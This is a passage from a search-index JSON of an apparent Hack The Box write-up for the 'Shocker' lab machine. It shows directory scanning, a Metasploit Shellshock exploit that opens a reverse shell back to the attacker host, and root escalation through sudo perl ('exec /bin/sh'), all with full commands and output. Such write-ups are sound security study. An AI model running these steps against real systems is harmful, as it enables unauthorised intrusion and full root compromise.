AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=\n|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Writeups/machines/shoker/writeup/#web-enumeration","title":"Web Enumeration","text":"<pre><code>\u039e OldBoxes/shocker \u2192 dirb http://10.10.10.56                                    \n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Fri Jul  2 00:44:44 2021\nURL_BASE: http://10.10.10.56/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://10.10.10.56/ ----\n+ http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                                                     \n+ http://10.10.10.56/index.html (CODE:200|SIZE:137)\n</code></pre>"},{"location":"Writeups/machines/shoker/writeup/#exploitation","title":"Exploitation","text":""},{"location":"Writeups/machines/shoker/writeup/#php-cgi-shellshock-rce","title":"PHP CGI ShellShock RCE","text":"<pre><code>\u039e HTB/Boxes \u2192 msfconsole\nmsf6 &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec\n\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set rhosts 10.10.10.56\nrhosts =&gt; 10.10.10.56\n\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set lhost tun0\nlhost =&gt; tun0\n\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; set targeturi http://10.10.10.56/cgi-bin/user.sh\ntargeturi =&gt; http://10.10.10.56/cgi-bin/user.sh\n\nmsf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt; exploit [*] Started reverse TCP handler on 10.10.14.27:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes)\n[*] Sending stage (36 bytes) to 10.10.10.56\n[*] Command shell session 1 opened (10.10.14.27:4444 -&gt; 10.10.10.56:54578) at 2021-07-02 01:07:49 -0400\n</code></pre> <pre><code>cd /home\nls\nshelly\ncd shelly\ncat user.txt\n3b57ccf9e22e42963b66361538597f4b\n</code></pre>"},{"location":"Writeups/machines/shoker/writeup/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Writeups/machines/shoker/writeup/#enumerate-suid","title":"Enumerate SUID","text":"<pre><code>sudo -l \nMatching Defaults entries for shelly on Shocker:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser shelly may run the following commands on Shocker:\n    (root) NOPASSWD: /usr/bin/perl\n</code></pre>"},{"location":"Writeups/machines/shoker/writeup/#obtaining-root-privileges","title":"Obtaining Root Privileges","text":"<pre><code>sudo /usr/bin/perl -e 'exec \"/bin/sh\";'\nid\nuid=0(root) gid=0(root) groups=0(root)\ncd /root\ncat root.txt\nae449b79adfb43de491e9bf4bc2a9c19\n</code></pre>"}]}